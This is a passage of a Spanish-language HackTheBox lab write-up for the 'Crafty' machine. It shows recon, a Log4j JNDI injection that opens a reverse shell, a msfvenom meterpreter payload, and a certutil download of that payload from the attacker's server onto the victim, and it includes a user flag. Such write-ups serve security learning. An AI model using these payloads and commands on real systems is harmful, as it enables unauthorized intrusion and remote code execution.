  <li>Iniciamos el escaneo por el protocolo <strong>TCP</strong> escaneando los puertos y servicios abiertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,25565 10.10.11.249 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-25 16:28 CST
Nmap scan report <span class="k">for </span>10.10.11.249
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://crafty.htb
25565/tcp open  minecraft Minecraft 1.16.5 <span class="o">(</span>Protocol: 127, Message: Crafty Server, Users: 0/100<span class="o">)</span>
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</code></pre></div></div>

<h2 id="enumeraci√≥n">Enumeraci√≥n</h2>

<ul>
  <li>Vamos agregar el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.249 crafty.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.249 crafty.htb
‚ûú  nmap ping <span class="nt">-c</span> 1 crafty.htb
PING crafty.htb <span class="o">(</span>10.10.11.249<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from crafty.htb <span class="o">(</span>10.10.11.249<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>109 ms

<span class="nt">---</span> crafty.htb ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 108.724/108.724/108.724/0.000 ms
</code></pre></div></div>

<ul>
  <li>Vemos otro subdominio en el cual podremos jugar por la interfaz de la pagina web sabemos que se trata del videojuego Minecraft <a href="https://www.minecraft.net/es-es">https://www.minecraft.net/es-es</a> tambi√©n <code class="language-plaintext highlighter-rouge">Nmap</code> no lo reporto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/crafty/1.png" />
</p>

<ul>
  <li>Vemos que el subdominio nos redirige a la pagina web principal.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap curl <span class="nt">-I</span> play.crafty.htb
HTTP/1.1 301 Moved Permanently
Content-Length: 140
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
Location: http://crafty.htb
Server: Microsoft-IIS/10.0
Date: Tue, 25 Jun 2024 22:35:13 GMT
</code></pre></div></div>

<ul>
  <li>No vemos nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap dirsearch <span class="nt">-u</span> http://crafty.htb
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/miguel/Hackthebox/Gatogamer_account/Crafty/nmap/reports/http_crafty.htb/_24-06-25_16-42-31.txt

Target: http://crafty.htb/

<span class="o">[</span>16:42:31] Starting:
<span class="o">[</span>16:42:33] 403 -  312B  - /%2e%2e//google.com
<span class="o">[</span>16:42:33] 301 -  144B  - /js  -&gt;  http://crafty.htb/js/
<span class="o">[</span>16:42:34] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
<span class="o">[</span>16:43:00] 403 -  312B  - /<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\e</span>tc<span class="se">\p</span>asswd
<span class="o">[</span>16:43:49] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
<span class="o">[</span>16:43:59] 301 -  145B  - /css  -&gt;  http://crafty.htb/css/
<span class="o">[</span>16:44:23] 301 -  145B  - /img  -&gt;  http://crafty.htb/img/
<span class="o">[</span>16:44:24] 301 -  145B  - /index.html  -&gt;  http://crafty.htb/home
<span class="o">[</span>16:44:29] 403 -    1KB - /js/
</code></pre></div></div>

<h2 id="minecraft">Minecraft</h2>

<ul>
  <li>
    <p>Minecraft usa Java por lo cual lo mas probable es que sea vulnerable al ataque <code class="language-plaintext highlighter-rouge">Log4j</code> que ya hemos explotado en otras ocasiones <a href="https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition">https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition</a>.</p>
  </li>
  <li>
    <p>Vamos a utilizar esta herramienta para correr el <code class="language-plaintext highlighter-rouge">Minecraft</code> <a href="https://github.com/ammaraskar/pyCraft?source=post_page-----316a735a306d--------------------------------">https://github.com/ammaraskar/pyCraft?source=post_page-----316a735a306d--------------------------------</a>&gt;.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content git clone https://github.com/ammaraskar/pyCraft
Cloning into <span class="s1">'pyCraft'</span>...
remote: Enumerating objects: 3182, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>158/158<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>70/70<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 3182 <span class="o">(</span>delta 106<span class="o">)</span>, reused 112 <span class="o">(</span>delta 88<span class="o">)</span>, pack-reused 3024
Receiving objects: 100% <span class="o">(</span>3182/3182<span class="o">)</span>, 775.28 KiB | 845.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>2222/2222<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
</code></pre></div></div>

<ol>
  <li>Ahora instalamos los <code class="language-plaintext highlighter-rouge">requierements.txt</code> para no obtener errores puedes hacer un <code class="language-plaintext highlighter-rouge">enviroment</code> para instalar las paqueter√≠as.</li>
</ol>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  pyCraft git:<span class="o">(</span>master<span class="o">)</span> virtualenv ENV

created virtual environment CPython3.11.9.final.0-64 <span class="k">in </span>3746ms
  creator CPython3Posix<span class="o">(</span><span class="nv">dest</span><span class="o">=</span>/home/miguel/Hackthebox/Crafty/content/pyCraft/ENV, <span class="nv">clear</span><span class="o">=</span>False, <span class="nv">no_vcs_ignore</span><span class="o">=</span>False, <span class="nv">global</span><span class="o">=</span>False<span class="o">)</span>
  seeder FromAppData<span class="o">(</span><span class="nv">download</span><span class="o">=</span>False, <span class="nv">pip</span><span class="o">=</span>bundle, <span class="nv">setuptools</span><span class="o">=</span>bundle, <span class="nv">wheel</span><span class="o">=</span>bundle, <span class="nv">via</span><span class="o">=</span>copy, <span class="nv">app_data_dir</span><span class="o">=</span>/home/miguel/.local/share/virtualenv<span class="o">)</span>
    added seed packages: <span class="nv">pip</span><span class="o">==</span>24.0, <span class="nv">setuptools</span><span class="o">==</span>68.1.2, <span class="nv">wheel</span><span class="o">==</span>0.43.0
  activators BashActivator,CShellActivator,FishActivator,NushellActivator,PowerShellActivator,PythonActivator
‚ûú  pyCraft git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">source </span>ENV/bin/activate

<span class="o">(</span>ENV<span class="o">)</span> ‚ûú  pyCraft git:<span class="o">(</span>master<span class="o">)</span> pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt

Obtaining file:///home/miguel/HacktheBox/Crafty/content/pyCraft <span class="o">(</span>from <span class="nt">-r</span> requirements.txt <span class="o">(</span>line 3<span class="o">))</span>
  Preparing metadata <span class="o">(</span>setup.py<span class="o">)</span> ... <span class="k">done
</span>Collecting cryptography&gt;<span class="o">=</span>1.5 <span class="o">(</span>from <span class="nv">pyCraft</span><span class="o">==</span>0.7.0-&gt;-r requirements.txt <span class="o">(</span>line 3<span class="o">))</span>
  Downloading cryptography-42.0.8-cp39-abi3-manylinux_2_28_x86_64.whl.metadata <span class="o">(</span>5.3 kB<span class="o">)</span>
Collecting pynbt <span class="o">(</span>from <span class="nv">pyCraft</span><span class="o">==</span>0.7.0-&gt;-r requirements.txt <span class="o">(</span>line 3<span class="o">))</span>
  Using cached PyNBT-3.1.0-py3-none-any.whl.metadata <span class="o">(</span>4.6 kB<span class="o">)</span>
Collecting requests <span class="o">(</span>from <span class="nv">pyCraft</span><span class="o">==</span>0.7.0-&gt;-r requirements.txt <span class="o">(</span>line 3<span class="o">))</span>
  Using cached requests-2.32.3-py3-none-any.whl.metadata <span class="o">(</span>4.6 kB<span class="o">)</span>
Collecting cffi&gt;<span class="o">=</span>1.12 <span class="o">(</span>from cryptography&gt;<span class="o">=</span>1.5-&gt;pyCraft<span class="o">==</span>0.7.0-&gt;-r requirements.txt <span class="o">(</span>line 3<span class="o">))</span>
  Using cached cffi-1.16.0-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata <span class="o">(</span>1.5 kB<span class="o">)</span>
Collecting mutf8&gt;<span class="o">=</span>1.0.2 <span class="o">(</span>from pynbt-&gt;pyCraft<span class="o">==</span>0.7.0-&gt;-r requirements.txt <span class="o">(</span>line 3<span class="o">))</span>
  Using cached mutf8-1.0.6-cp311-cp311-linux_x86_64.whl
Collecting charset-normalizer&lt;4,&gt;<span class="o">=</span>2 <span class="o">(</span>from requests-&gt;pyCraft<span class="o">==</span>0.7.0-&gt;-r requirements.txt <span class="o">(</span>line 3<span class="o">))</span>
  Using cached charset_normalizer-3.3.2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata <span class="o">(</span>33 kB<span class="o">)</span>
Collecting idna&lt;4,&gt;<span class="o">=</span>2.5 <span class="o">(</span>from requests-&gt;pyCraft<span class="o">==</span>0.7.0-&gt;-r requirements.txt <span class="o">(</span>line 3<span class="o">))</span>
  Using cached idna-3.7-py3-none-any.whl.metadata <span class="o">(</span>9.9 kB<span class="o">)</span>
Collecting urllib3&lt;3,&gt;<span class="o">=</span>1.21.1 <span class="o">(</span>from requests-&gt;pyCraft<span class="o">==</span>0.7.0-&gt;-r requirements.txt <span class="o">(</span>line 3<span class="o">))</span>
  Downloading urllib3-2.2.2-py3-none-any.whl.metadata <span class="o">(</span>6.4 kB<span class="o">)</span>
Collecting certifi&gt;<span class="o">=</span>2017.4.17 <span class="o">(</span>from requests-&gt;pyCraft<span class="o">==</span>0.7.0-&gt;-r requirements.txt <span class="o">(</span>line 3<span class="o">))</span>
  Using cached certifi-2024.6.2-py3-none-any.whl.metadata <span class="o">(</span>2.2 kB<span class="o">)</span>
Collecting pycparser <span class="o">(</span>from cffi&gt;<span class="o">=</span>1.12-&gt;cryptography&gt;<span class="o">=</span>1.5-&gt;pyCraft<span class="o">==</span>0.7.0-&gt;-r requirements.txt <span class="o">(</span>line 3<span class="o">))</span>
  Downloading pycparser-2.22-py3-none-any.whl.metadata <span class="o">(</span>943 bytes<span class="o">)</span>
Downloading cryptography-42.0.8-cp39-abi3-manylinux_2_28_x86_64.whl <span class="o">(</span>3.9 MB<span class="o">)</span>
   ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ 3.9/3.9 MB 2.7 MB/s eta 0:00:00
Using cached PyNBT-3.1.0-py3-none-any.whl <span class="o">(</span>7.3 kB<span class="o">)</span>
Using cached requests-2.32.3-py3-none-any.whl <span class="o">(</span>64 kB<span class="o">)</span>
Using cached certifi-2024.6.2-py3-none-any.whl <span class="o">(</span>164 kB<span class="o">)</span>
Using cached cffi-1.16.0-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl <span class="o">(</span>464 kB<span class="o">)</span>
Using cached charset_normalizer-3.3.2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl <span class="o">(</span>140 kB<span class="o">)</span>
Using cached idna-3.7-py3-none-any.whl <span class="o">(</span>66 kB<span class="o">)</span>
Downloading urllib3-2.2.2-py3-none-any.whl <span class="o">(</span>121 kB<span class="o">)</span>
   ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ 121.4/121.4 kB 11.2 MB/s eta 0:00:00
Downloading pycparser-2.22-py3-none-any.whl <span class="o">(</span>117 kB<span class="o">)</span>
   ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ 117.6/117.6 kB 5.2 MB/s eta 0:00:00
Installing collected packages: mutf8, urllib3, pynbt, pycparser, idna, charset-normalizer, certifi, requests, cffi, cryptography, pyCraft
  Running setup.py develop <span class="k">for </span>pyCraft
Successfully installed certifi-2024.6.2 cffi-1.16.0 charset-normalizer-3.3.2 cryptography-42.0.8 idna-3.7 mutf8-1.0.6 pyCraft-0.7.0 pycparser-2.22 pynbt-3.1.0 requests-2.32.3 urllib3-2.2.2
</code></pre></div></div>

<ul>
  <li>
    <p>Para ejecutar todo de manera correcta necesitamos el <code class="language-plaintext highlighter-rouge">jdk</code> de java <a href="https://repo.huaweicloud.com/java/jdk/8u181-b13/">https://repo.huaweicloud.com/java/jdk/8u181-b13/</a>.</p>
  </li>
  <li>
    <p>Primero nos clonamos el repositorio con el cual explotaremos el <code class="language-plaintext highlighter-rouge">log4j</code> <a href="https://github.com/kozmer/log4j-shell-poc">https://github.com/kozmer/log4j-shell-poc</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content git clone https://github.com/kozmer/log4j-shell-poc
Cloning into <span class="s1">'log4j-shell-poc'</span>...
remote: Enumerating objects: 52, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>12/12<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>12/12<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 52 <span class="o">(</span>delta 0<span class="o">)</span>, reused 1 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 40
Receiving objects: 100% <span class="o">(</span>52/52<span class="o">)</span>, 38.74 MiB | 957.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>7/7<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
Updating files: 100% <span class="o">(</span>36/36<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
‚ûú  content <span class="nb">cd </span>log4j-shell-poc
‚ûú  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz

<span class="nt">--2024-06-25</span> 16:58:41--  https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
Resolving repo.huaweicloud.com <span class="o">(</span>repo.huaweicloud.com<span class="o">)</span>... 199.91.74.172, 199.91.74.173, 199.91.74.174, ...
Connecting to repo.huaweicloud.com <span class="o">(</span>repo.huaweicloud.com<span class="o">)</span>|199.91.74.172|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 185646832 <span class="o">(</span>177M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
Saving to: ‚Äòjdk-8u181-linux-x64.tar.gz‚Äô

jdk-8u181-linux 100%[<span class="o">=======&gt;]</span> 177.05M  8.21MB/s    <span class="k">in </span>37s

2024-06-25 16:59:18 <span class="o">(</span>4.84 MB/s<span class="o">)</span> - ‚Äòjdk-8u181-linux-x64.tar.gz‚Äô saved <span class="o">[</span>185646832/185646832]

‚ûú  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> ‚úó <span class="nb">tar</span> <span class="nt">-xf</span> jdk-8u181-linux-x64.tar.gz
‚ûú  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> ‚úó <span class="nb">mv </span>jdk1.8.0_181 jdk1.8.0_20
</code></pre></div></div>

<ul>
  <li>
    <p>Iniciamos el <code class="language-plaintext highlighter-rouge">poc</code> como tal tenemos que inyectar la <code class="language-plaintext highlighter-rouge">query</code> del <code class="language-plaintext highlighter-rouge">ldap</code> para poder obtener la reverse shell.</p>
  </li>
  <li>
    <p>Vamos a decirle que nos de una cmd.exe ya que es una m√°quina Windows.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/crafty/2.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> ‚úó python3 poc.py <span class="nt">--userip</span> 10.10.14.63 <span class="nt">--webport</span> 80 <span class="nt">--lport</span> 4444

<span class="o">[!]</span> CVE: CVE-2021-44228
<span class="o">[!]</span> Github repo: https://github.com/kozmer/log4j-shell-poc

Picked up _JAVA_OPTIONS: <span class="nt">-Dawt</span>.useSystemAAFontSettings<span class="o">=</span>on <span class="nt">-Dswing</span>.aatext<span class="o">=</span><span class="nb">true</span>
<span class="o">[</span>+] Exploit java class created success
<span class="o">[</span>+] Setting up LDAP server

<span class="o">[</span>+] Send me: <span class="k">${</span><span class="nv">jndi</span>:ldap://10.10.14.63:1389/a<span class="k">}</span>

<span class="o">[</span>+] Starting Webserver on port 80 http://0.0.0.0:80
Picked up _JAVA_OPTIONS: <span class="nt">-Dawt</span>.useSystemAAFontSettings<span class="o">=</span>on <span class="nt">-Dswing</span>.aatext<span class="o">=</span><span class="nb">true
</span>Listening on 0.0.0.0:1389
</code></pre></div></div>

<ul>
  <li>Ahora nos conectamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>ENV<span class="o">)</span> ‚ûú  pyCraft git:<span class="o">(</span>master<span class="o">)</span> python3 start.py
Enter your username: miguelito
Enter your password <span class="o">(</span>leave blank <span class="k">for </span>offline mode<span class="o">)</span>:
Enter server host or host:port <span class="o">(</span>enclose IPv6 addresses <span class="k">in </span>square brackets<span class="o">)</span>: 10.10.11.249
Connecting <span class="k">in </span>offline mode...
Connected.
</code></pre></div></div>

<ul>
  <li>nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ rlwrap nc <span class="nt">-nlvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
</code></pre></div></div>

<ul>
  <li>Ahora inyectamos el comando.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>ENV<span class="o">)</span> ‚ûú  pyCraft git:<span class="o">(</span>master<span class="o">)</span> python3 start.py
Enter your username: miguelito
Enter your password <span class="o">(</span>leave blank <span class="k">for </span>offline mode<span class="o">)</span>:
Enter server host or host:port <span class="o">(</span>enclose IPv6 addresses <span class="k">in </span>square brackets<span class="o">)</span>: 10.10.11.249
Connecting <span class="k">in </span>offline mode...
Connected.
<span class="k">${</span><span class="nv">jndi</span>:ldap://10.10.14.63:1389/a<span class="k">}</span>
</code></pre></div></div>

<ul>
  <li>Recibimos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> ‚úó rlwrap nc <span class="nt">-nlvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.249] 49705
Microsoft Windows <span class="o">[</span>Version 10.0.17763.5329]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

c:<span class="se">\u</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\s</span>erver&gt;whoami
<span class="nb">whoami
</span>crafty<span class="se">\s</span>vc_minecraft

c:<span class="se">\u</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\s</span>erver&gt;
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Podemos ver la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\u</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\s</span>erver&gt;type C:<span class="se">\U</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
df1f5b5d2fa525f1f5e37c202cc07b98
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Vemos un <code class="language-plaintext highlighter-rouge">.jar</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\U</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\s</span>erver<span class="se">\p</span>lugins&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:<span class="se">\U</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\s</span>erver<span class="se">\p</span>lugins

10/27/2023  02:48 PM    &lt;DIR&gt;          <span class="nb">.</span>
10/27/2023  02:48 PM    &lt;DIR&gt;          ..
10/27/2023  02:48 PM             9,996 playercounter-1.0-SNAPSHOT.jar
               1 File<span class="o">(</span>s<span class="o">)</span>          9,996 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   3,809,091,584 bytes free
</code></pre></div></div>

<ul>
  <li>Podemos descarg√°rnoslo usando <code class="language-plaintext highlighter-rouge">Metasploit</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.63 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> reverse.exe

<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
</code></pre></div></div>

<ul>
  <li>Ahora configuramos todo en <code class="language-plaintext highlighter-rouge">Metasploit</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ msfconsole
Metasploit tip: To save all commands executed since start up to a file, use the
makerc <span class="nb">command


</span>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN<span class="nv">$ </span>                          vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm <span class="sb">`</span>?MMM             MMMM<span class="sb">`</span> dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        https://metasploit.com


       <span class="o">=[</span> metasploit v6.4.2-dev                           <span class="o">]</span>
+ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 2408 exploits - 1240 auxiliary - 422 post       <span class="o">]</span>
+ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 1468 payloads - 47 encoders - 11 nops           <span class="o">]</span>
+ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 9 evasion                                       <span class="o">]</span>

Metasploit Documentation: https://docs.metasploit.com/

msf6 <span class="o">&gt;</span> use multi/handler
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using configured payload generic/shell_reverse_tcp
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/x64/meterpreter/reverse_tcp
payload <span class="o">=&gt;</span> windows/x64/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 10.10.14.63
lhost <span class="o">=&gt;</span> 10.10.14.63
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lport 443
lport <span class="o">=&gt;</span> 443
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.63:443
</code></pre></div></div>

<ul>
  <li>Ahora nos pasamos el <code class="language-plaintext highlighter-rouge">.exe</code> a la m√°quina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content python3 <span class="nt">-m</span> http.server 8080
Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ahora lo descargamos y lo metemos a la ruta <strong>/temp</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\U</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\s</span>erver<span class="se">\p</span>lugins&gt;certutil <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.14.63:8080/reverse.exe %temp%/reverse.exe
certutil <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.14.63:8080/reverse.exe %temp%/reverse.exe
<span class="k">****</span>  Online  <span class="k">****</span>
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<ul>
  <li>All√≠ lo tenemos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\U</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\s</span>erver<span class="se">\p</span>lugins&gt;cd %temp%
<span class="nb">cd</span> %temp%

C:<span class="se">\U</span>sers<span class="se">\S</span>VC_MI~1<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of C:<span class="se">\U</span>sers<span class="se">\S</span>VC_MI~1<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp

06/25/2024  04:37 PM    &lt;DIR&gt;          <span class="nb">.</span>
06/25/2024  04:37 PM    &lt;DIR&gt;          ..
11/21/2023  03:13 AM             6,830 au-descriptor-1.8.0_391-b13.xml
06/25/2024  03:28 PM    &lt;DIR&gt;          hsperfdata_svc_minecraft
06/25/2024  03:28 PM            56,670 jusched.log
11/21/2023  03:08 AM    &lt;DIR&gt;          Low
06/25/2024  03:40 PM    &lt;DIR&gt;          RDRD0D4.tmp
06/25/2024  04:37 PM             7,168 reverse.exe
               3 File<span class="o">(</span>s<span class="o">)</span>         70,668 bytes
               5 Dir<span class="o">(</span>s<span class="o">)</span>   3,658,072,064 bytes free

